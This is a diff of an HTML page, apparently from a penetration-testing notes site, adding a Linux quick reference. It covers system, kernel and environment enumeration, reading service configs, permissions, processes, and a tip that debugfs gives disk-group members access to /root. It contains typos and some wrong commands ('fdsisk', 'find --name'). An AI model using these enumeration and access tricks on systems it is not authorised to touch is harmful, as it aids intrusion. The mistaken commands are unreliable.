@@ -77,6 +77,10 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
+      <a href="#quick-reference" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
     
       <header class="md-header" data-md-component="header">
   <nav class="md-header-nav md-grid">
@@ -306,9 +310,133 @@
     <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
     
     
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Linux
+      </label>
+    
     <a href="./" title="Linux" class="md-nav__link md-nav__link--active">
       Linux
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference" class="md-nav__link">
+    Quick Reference
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#os-information" class="md-nav__link">
+    OS Information
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#startup-process" class="md-nav__link">
+    Startup Process
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#daemons" class="md-nav__link">
+    Daemons
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#managing-disks" class="md-nav__link">
+    Managing Disks
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#permissions" class="md-nav__link">
+    Permissions
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#processes" class="md-nav__link">
+    Processes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#services" class="md-nav__link">
+    Services
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#networking" class="md-nav__link">
+    Networking
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#general-exploits" class="md-nav__link">
+    General Exploits
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#important-files" class="md-nav__link">
+    Important Files
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#special-file-handling" class="md-nav__link">
+    Special File Handling
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defense" class="md-nav__link">
+    Defense
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
     
   </li>
 
@@ -1125,44 +1253,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../os/linux/0-cheatsheet/" title="Cheatsheet" class="md-nav__link">
-      Cheatsheet
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../os/linux/important-files/" title="Important Files / Folders" class="md-nav__link">
-      Important Files / Folders
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
     <a href="../os/linux/important-issues/" title="Collections" class="md-nav__link">
       Collections
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../os/linux/kernel-exploitation/" title="Kernel Exploitation" class="md-nav__link">
-      Kernel Exploitation
     </a>
   </li>
 
@@ -1176,126 +1268,6 @@
     <a href="../os/linux/privilege-escalation/" title="Privilege Escalation" class="md-nav__link">
       Privilege Escalation
     </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../os/linux/wildcards/" title="Wildcards" class="md-nav__link">
-      Wildcards
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../os/linux/x-Defense/" title="Defense" class="md-nav__link">
-      Defense
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../os/linux/z-References/" title="References" class="md-nav__link">
-      References
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-26-1-9" type="checkbox" id="nav-26-1-9">
-    
-    <label class="md-nav__link" for="nav-26-1-9">
-      Tools
-    </label>
-    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
-      <label class="md-nav__title" for="nav-26-1-9">
-        Tools
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../os/linux/tools/grep/" title="Grep" class="md-nav__link">
-      Grep
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../os/linux/tools/iptables/" title="Iptables" class="md-nav__link">
-      Iptables
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../os/linux/tools/netcat/" title="Netcat (NC)" class="md-nav__link">
-      Netcat (NC)
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../os/linux/tools/tcpdump/" title="tcpdump" class="md-nav__link">
-      tcpdump
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../os/linux/tools/vi/" title="VI" class="md-nav__link">
-      VI
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
   </li>
 
         
@@ -2195,166 +2167,10 @@
       <input class="md-toggle md-nav__toggle" data-md-toggle="nav-28" type="checkbox" id="nav-28">
     
     <label class="md-nav__link" for="nav-28">
-      Reverse engineering
-    </label>
-    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
-      <label class="md-nav__title" for="nav-28">
-        Reverse engineering
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-28-1" type="checkbox" id="nav-28-1">
-    
-    <label class="md-nav__link" for="nav-28-1">
-      Linux
-    </label>
-    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-28-1">
-        Linux
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../reverse-engineering/linux/elf/" title="ELF" class="md-nav__link">
-      ELF
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../reverse-engineering/linux/gdb/" title="GDB" class="md-nav__link">
-      GDB
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../reverse-engineering/linux/setup/" title="Lab Setup" class="md-nav__link">
-      Lab Setup
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-28-2" type="checkbox" id="nav-28-2">
-    
-    <label class="md-nav__link" for="nav-28-2">
-      Windows
-    </label>
-    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-28-2">
-        Windows
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../reverse-engineering/windows/pe/" title="PE Files" class="md-nav__link">
-      PE Files
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../reverse-engineering/windows/tools/" title="Tools" class="md-nav__link">
-      Tools
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../reverse-engineering/windows/vba/" title="VBA" class="md-nav__link">
-      VBA
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../reverse-engineering/windows/x-Defense/" title="Defense" class="md-nav__link">
-      Defense
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-    
-      
-      
-      
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29" type="checkbox" id="nav-29">
-    
-    <label class="md-nav__link" for="nav-29">
       Sqlserver
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
-      <label class="md-nav__title" for="nav-29">
+      <label class="md-nav__title" for="nav-28">
         Sqlserver
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -2540,6 +2356,132 @@
               </div>
             
             
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference" class="md-nav__link">
+    Quick Reference
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#os-information" class="md-nav__link">
+    OS Information
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#startup-process" class="md-nav__link">
+    Startup Process
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#daemons" class="md-nav__link">
+    Daemons
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#managing-disks" class="md-nav__link">
+    Managing Disks
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#permissions" class="md-nav__link">
+    Permissions
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#processes" class="md-nav__link">
+    Processes
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#services" class="md-nav__link">
+    Services
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#networking" class="md-nav__link">
+    Networking
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#general-exploits" class="md-nav__link">
+    General Exploits
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#important-files" class="md-nav__link">
+    Important Files
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#special-file-handling" class="md-nav__link">
+    Special File Handling
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defense" class="md-nav__link">
+    Defense
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
           
           <div class="md-content">
             <article class="md-content__inner md-typeset">
@@ -2548,7 +2490,687 @@
                 
                   <h1>Linux</h1>
                 
-                
+                <h2 id="quick-reference">Quick Reference<a class="headerlink" href="#quick-reference" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Bash cheatsheet: <a href="https://devhints.io/bash.html">https://devhints.io/bash.html</a></li>
+<li>Archiving/compressing: <a href="https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/">https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/</a></li>
+</ul>
+<h3 id="os-information">OS Information<a class="headerlink" href="#os-information" title="Permanent link">&para;</a></h3>
+<ul>
+<li>System Information
+    <div class="codehilite"><pre><span></span>cat /proc/net/dev
+lspci
+ip link show
+ip addr show
+
+lscpu
+cat /proc/cpuinfo
+</pre></div></li>
+<li>File information: <code class="codehilite"><span class="n">file</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span></code></li>
+<li>Shared library dependencies: <code class="codehilite"><span class="n">ldd</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span></code></li>
+<li>Searching:<ul>
+<li>With database: <code class="codehilite"><span class="n">updatedb</span> <span class="p">;</span> <span class="n">locate</span> <span class="n">sbd</span><span class="p">.</span><span class="n">exe</span></code></li>
+<li>Within PATH: <code class="codehilite"><span class="n">which</span> <span class="n">sbd</span></code> <code class="codehilite"><span class="n">whereis</span> <span class="n">sdb</span></code></li>
+<li>Complex:
+  <div class="codehilite"><pre><span></span>find  /  -­‐name  sbd*
+find / --name sdb* --exec file <span class="o">{}</span> <span class="se">\;</span>
+</pre></div></li>
+<li>Search for hidden (dot) files<code class="codehilite"><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="k">type</span> <span class="n">d</span> <span class="o">-</span><span class="n">name</span> <span class="ss">&quot;.*&quot;</span></code></li>
+</ul>
+</li>
+<li>Mounting Devices:
+    <div class="codehilite"><pre><span></span>mount -t &lt;filesystemtype&gt; &lt;location&gt;
+mount -t /dev/cdrom /media
+umount /dev/cdrom
+</pre></div></li>
+<li>Distribution
+    <div class="codehilite"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">issue</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="cm">/*-release</span>
+<span class="cm">cat /etc/lsb-release  ### Debian based</span>
+<span class="cm">cat /etc/redhat-release   ### Redhat based</span>
+</pre></div></li>
+<li>Kernel
+    <div class="codehilite"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="k">version</span>
+<span class="n">uname</span> <span class="o">-</span><span class="n">a</span>
+<span class="n">uname</span> <span class="o">-</span><span class="n">mrs</span>
+<span class="n">rpm</span> <span class="o">-</span><span class="n">q</span> <span class="n">kernel</span>
+<span class="n">dmesg</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">Linux</span>
+<span class="n">ls</span> <span class="o">/</span><span class="n">boot</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">vmlinuz</span><span class="o">-</span>
+</pre></div><ul>
+<li>Kernel tuning<ul>
+<li>Temporary: <code class="codehilite"><span class="n">sysctl</span></code></li>
+<li>Permanent: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sysctl</span><span class="p">.</span><span class="n">conf</span></code></li>
+<li>View configuration: <code class="codehilite"><span class="n">sysctl</span> <span class="o">-</span><span class="n">a</span> <span class="o">|</span> <span class="k">less</span></code></li>
+<li>View  configuration files for the installed modprobe modules:
+  <div class="codehilite"><pre><span></span><span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">modprobe</span><span class="p">.</span><span class="n">d</span><span class="o">/</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">R</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="err">$</span><span class="p">(</span> <span class="n">uname</span> <span class="o">-</span><span class="n">r</span> <span class="p">)</span><span class="o">/</span><span class="n">kernel</span>
+</pre></div></li>
+</ul>
+</li>
+<li>Kernel Modules<ul>
+<li>Insert module: <code class="codehilite"><span class="n">insmod</span></code></li>
+<li>Remove module: <code class="codehilite"><span class="n">modprobe</span> <span class="o">-</span><span class="n">r</span></code> <code class="codehilite"><span class="n">rmmod</span></code></li>
+<li>List modules: <code class="codehilite"><span class="n">modprobe</span> <span class="o">-</span><span class="n">l</span></code> <code class="codehilite"><span class="n">lsmod</span></code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Environment
+    <div class="codehilite"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">profile</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">bashrc</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">bash_profile</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">bashrc</span>
+<span class="n">cat</span> <span class="o">~/</span><span class="p">.</span><span class="n">bash_logout</span>
+<span class="n">env</span>
+<span class="k">set</span>
+</pre></div></li>
+<li>Printers: <code class="codehilite"><span class="n">lpstat</span> <span class="o">-</span><span class="n">a</span></code></li>
+<li>Sys calls: <code class="codehilite"><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="k">include</span> <span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">asm</span><span class="o">/</span><span class="nv">unistd_32</span>.<span class="nv">h</span></code></li>
+<li>New line in command line
+    <div class="codehilite"><pre><span></span>$ <span class="nb">echo</span> <span class="s2">&quot;abc[CTRL+M]</span>
+<span class="s2">def&quot;</span>
+</pre></div></li>
+<li>Change password (one liner): <code class="codehilite"><span class="n">echo</span> <span class="n">root</span><span class="p">:</span><span class="n">password</span> <span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">chpasswd</span></code></li>
+<li>Bash Variables:<ul>
+<li><code class="codehilite"><span class="err">$</span><span class="mi">0</span></code> - The name of the Bash script</li>
+<li><code class="codehilite"><span class="err">$</span><span class="mi">1</span></code> - $9 - The first 9 arguments to the Bash script</li>
+<li><code class="codehilite"><span class="err">$</span><span class="o">#</span></code> - Number of arguments passed to the Bash script</li>
+<li><code class="codehilite"><span class="err">$</span><span class="o">@</span></code> - All arguments passed to the Bash script</li>
+<li><code class="codehilite"><span class="err">$</span><span class="o">?</span></code> - The exit status of the most recently run process</li>
+<li><code class="codehilite"><span class="err">$$</span></code> - The process ID of the current script</li>
+<li><code class="codehilite"><span class="err">$</span><span class="k">USER</span></code> - The username of the user running the script</li>
+<li><code class="codehilite"><span class="err">$</span><span class="n">HOSTNAME</span></code> - The hostname of the machine</li>
+<li><code class="codehilite">$<span class="k">RANDOM</span></code> - A random number</li>
+<li><code class="codehilite"><span class="err">$</span><span class="n">LINENO</span></code> - The current line number in the script</li>
+</ul>
+</li>
+</ul>
+<h3 id="startup-process">Startup Process<a class="headerlink" href="#startup-process" title="Permanent link">&para;</a></h3>
+<p><img alt="" src="https://img.wonderhowto.com/img/44/77/63591930046359/0/linux-basics-for-aspiring-hacker-using-start-up-scripts.w1456.jpg" /></p>
+<blockquote>
+<p><a href="https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/">https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/</a></p>
+</blockquote>
+<ul>
+<li>Run levels
+    <div class="codehilite"><pre><span></span><span class="mi">0</span> <span class="o">-</span> <span class="n">halt</span> <span class="n">the</span> <span class="k">system</span>
+<span class="mi">1</span> <span class="o">-</span> <span class="n">single</span> <span class="k">user</span> <span class="k">mode</span> <span class="p">(</span><span class="n">minimal</span> <span class="n">services</span><span class="p">)</span>
+<span class="mi">2</span> <span class="o">-</span> <span class="n">multi</span><span class="o">-</span><span class="k">user</span> <span class="n">modes</span>
+<span class="mi">3</span> <span class="o">-</span> <span class="n">multi</span><span class="o">-</span><span class="k">user</span> <span class="k">mode</span>
+<span class="mi">4</span> <span class="o">-</span> <span class="n">multi</span><span class="o">-</span><span class="k">user</span> <span class="k">mode</span>
+<span class="mi">5</span> <span class="o">-</span> <span class="n">multi</span><span class="o">-</span><span class="k">user</span> <span class="k">mode</span>
+<span class="mi">6</span> <span class="o">-</span> <span class="n">reboot</span> <span class="n">the</span> <span class="k">system</span>
+</pre></div></li>
+<li>Init.d Process<ul>
+<li>Has process ID: 1</li>
+<li><code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span><span class="p">.</span><span class="n">d</span></code> scripts with 755 permission</li>
+<li>init process then hands over the boot-up processes to <code class="codehilite"><span class="n">rc</span><span class="p">.</span><span class="n">d</span></code> daemon</li>
+</ul>
+</li>
+<li>rc.local - Script to start necessary processes in the background when the system boots up: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">rc</span><span class="p">.</span><span class="k">local</span></code></li>
+</ul>
+<h3 id="daemons">Daemons<a class="headerlink" href="#daemons" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code class="codehilite"><span class="n">inetd</span></code>, <code class="codehilite"><span class="n">xinetd</span></code> - Inetd always runs in the background and it then decides when to start and stop other daemons.</li>
+<li><code class="codehilite"><span class="n">rlinetd</span></code>
+    <div class="codehilite"><pre><span></span><span class="n">rlinetd</span><span class="p">.</span><span class="n">conf</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">rlinetd</span><span class="p">.</span><span class="n">d</span>
+</pre></div><ul>
+<li>Disable unnecessary demons</li>
+<li>Configure IPs that can access a demon</li>
+</ul>
+</li>
+</ul>
+<h3 id="managing-disks">Managing Disks<a class="headerlink" href="#managing-disks" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Managing Hard Disks<ul>
+<li><code class="codehilite"><span class="n">hda</span></code> for hard disks.</li>
+<li><code class="codehilite"><span class="n">sda</span></code> for newer SATA disks (SCSI).</li>
+<li>Partitions within <code class="codehilite"><span class="n">sda</span></code> are <code class="codehilite"><span class="n">sda1</span></code>, <code class="codehilite"><span class="n">sda2</span></code>, ...</li>
+</ul>
+</li>
+<li>Basic disk Information: <code class="codehilite"><span class="n">df</span> <span class="o">-</span><span class="n">h</span></code></li>
+<li>Partitions on disk: <code class="codehilite"><span class="n">fdsisk</span> <span class="o">-</span><span class="n">l</span></code></li>
+<li>Block device information: <code class="codehilite"><span class="n">lsblk</span></code></li>
+<li>Editing and displaying partitions: <code class="codehilite"><span class="n">parted</span></code> / <code class="codehilite"><span class="n">cfdisk</span></code><ul>
+<li><code class="codehilite"><span class="p">(</span><span class="n">parted</span><span class="p">)</span> <span class="n">print</span></code></li>
+<li><code class="codehilite"><span class="p">(</span><span class="n">parted</span><span class="p">)</span> <span class="k">select</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">sdb</span></code></li>
+</ul>
+</li>
+<li>Change HDD parameters: <code class="codehilite"><span class="n">hdparm</span></code></li>
+</ul>
+<ul>
+<li>Debugfs<ul>
+<li>Simple-to-use RAM-based file system specially designed for debugging purposes</li>
+<li>Mount file system (usable to access <code class="codehilite"><span class="o">/</span><span class="n">root</span></code> by only being in <code class="codehilite"><span class="n">disk</span></code> group)
+  <div class="codehilite"><pre><span></span><span class="n">debugfs</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">sda1</span>
+</pre></div></li>
+</ul>
+</li>
+</ul>
+<h3 id="permissions">Permissions<a class="headerlink" href="#permissions" title="Permanent link">&para;</a></h3>
+<ul>
+<li>File Permissions:
+    <div class="codehilite"><pre><span></span><span class="mi">0</span> <span class="o">=</span> <span class="k">No</span> <span class="n">Permission</span>
+<span class="mi">1</span> <span class="o">=</span> <span class="k">Execute</span>
+<span class="mi">2</span> <span class="o">=</span> <span class="k">Write</span>
+<span class="mi">4</span> <span class="o">=</span> <span class="k">Read</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="n">r</span> <span class="n">w</span> <span class="n">x</span>
+<span class="mi">4</span> <span class="mi">2</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">7</span>
+</pre></div></li>
+<li>Setuid - Set User ID - The process's effective user ID gets set to that of the program file itself (rather than that of the user running it).<ul>
+<li><code class="codehilite"><span class="n">S</span></code> - just the setuid bit</li>
+<li><code class="codehilite"><span class="n">s</span></code> - setuid bit and execute x</li>
+<li>Dir - No effect on DIRs</li>
+</ul>
+</li>
+<li>Setgid - Set Group ID - The process's effective group ID gets set to that of the program file (rather than that of the user's primary group).<ul>
+<li>Dir - any files created in that directory will have the same group as that directory</li>
+<li><a href="http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html">http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="processes">Processes<a class="headerlink" href="#processes" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Running processes: <code class="codehilite"><span class="n">ps</span> <span class="n">aux</span></code> <code class="codehilite"><span class="n">ps</span> <span class="o">-</span><span class="n">ef</span></code> <code class="codehilite"><span class="n">top</span></code></li>
+<li>Tree of processes (processes &amp; threads): <code class="codehilite"><span class="n">pstree</span> <span class="o">-</span><span class="n">aclp</span></code></li>
+<li>Process priority: <code class="codehilite"><span class="n">nice</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="mi">20</span> <span class="o">&lt;</span><span class="n">command</span><span class="o">&gt;</span></code> <code class="codehilite"><span class="n">renice</span> <span class="o">&lt;</span><span class="n">nice</span><span class="o">-</span><span class="n">value</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">pid</span><span class="o">&gt;</span></code><ul>
+<li><code class="codehilite"><span class="o">-</span><span class="mi">20</span></code> is highest priority</li>
+<li><code class="codehilite"><span class="mi">19</span></code> is lowest priority</li>
+</ul>
+</li>
+<li>Memory map for a process: <code class="codehilite"><span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="mi">1234</span><span class="o">/</span><span class="n">maps</span></code> <code class="codehilite"><span class="n">gdb</span><span class="o">&gt;</span> <span class="n">info</span> <span class="n">proc</span> <span class="n">mappings</span></code> <code class="codehilite"><span class="n">pmap</span> <span class="o">-</span><span class="n">d</span> <span class="mi">1234</span></code></li>
+<li><code class="codehilite"><span class="o">/</span><span class="n">proc</span></code>
+    - <code class="codehilite"><span class="o">/</span><span class="n">proc</span><span class="o">/&lt;</span><span class="n">id</span><span class="o">&gt;/</span><span class="n">environ</span></code> environment variables
+    - <code class="codehilite"><span class="o">/</span><span class="n">proc</span><span class="o">/&lt;</span><span class="n">id</span><span class="o">&gt;/</span><span class="n">cmdline</span></code> command line args/command used to run the process
+    - <code class="codehilite"><span class="o">/</span><span class="n">proc</span><span class="o">/&lt;</span><span class="n">id</span><span class="o">&gt;/</span><span class="n">maps</span></code> memory map
+    - <code class="codehilite"><span class="o">/</span><span class="n">proc</span><span class="o">/&lt;</span><span class="n">id</span><span class="o">&gt;/</span><span class="n">fd</span></code> open file descriptors</li>
+<li>Trace system and library calls<ul>
+<li><code class="codehilite"><span class="n">ltrace</span></code></li>
+<li><code class="codehilite"><span class="n">strace</span></code></li>
+</ul>
+</li>
+<li>Access control<ul>
+<li><code class="codehilite"><span class="k">access</span></code> - Check permissions for the UID and GID of the process (executable file owner / group)<ul>
+<li>Check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="services">Services<a class="headerlink" href="#services" title="Permanent link">&para;</a></h3>
+<ul>
+<li>List of Services: <code class="codehilite"><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">services</span></code></li>
+<li>Commons service configurations
+    <div class="codehilite"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">syslog</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">chttp</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">lighttpd</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cups</span><span class="o">/</span><span class="n">cupsd</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">inetd</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">apache2</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">my</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">lampp</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">aRl</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span> <span class="o">|</span> <span class="n">awk</span> <span class="err">&#39;$</span><span class="mi">1</span> <span class="o">~</span> <span class="o">/^</span><span class="p">.</span><span class="o">*</span><span class="n">r</span><span class="p">.</span><span class="o">*/</span>
+</pre></div></li>
+<li>Check if certain service is up: <code class="codehilite"><span class="k">update</span><span class="o">-</span><span class="err">­‐</span><span class="n">rc</span><span class="p">.</span><span class="n">d</span> <span class="n">ssh</span> <span class="n">enable</span></code></li>
+<li>Auto start a service: <code class="codehilite"><span class="k">update</span><span class="o">-</span><span class="err">­‐</span><span class="n">rc</span><span class="p">.</span><span class="n">d</span> <span class="n">ssh</span> <span class="n">enable</span></code></li>
+<li>Systemd services: <code class="codehilite"><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="k">system</span><span class="o">/</span><span class="n">snapd</span><span class="p">.</span><span class="n">service</span></code></li>
+<li>Systemd socket unit file:
+    <div class="codehilite"><pre><span></span><span class="k">[Socket]</span>
